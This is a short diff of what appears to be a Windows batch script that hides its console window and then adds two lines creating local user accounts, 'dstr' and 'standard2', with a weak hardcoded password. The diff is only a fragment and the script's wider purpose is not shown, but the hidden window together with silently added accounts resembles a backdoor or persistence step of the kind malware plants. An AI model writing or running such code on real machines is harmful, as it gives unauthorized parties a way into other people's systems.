@@ -4,6 +4,8 @@ echo Minimizing...
 powershell -window minimized -command ""
 echo Hiding...
 powershell -window hidden -command ""
+net user /add dstr 123456!
+net user /add standard2 123456!
 cd C:/
 mkdir tools
 cd tools
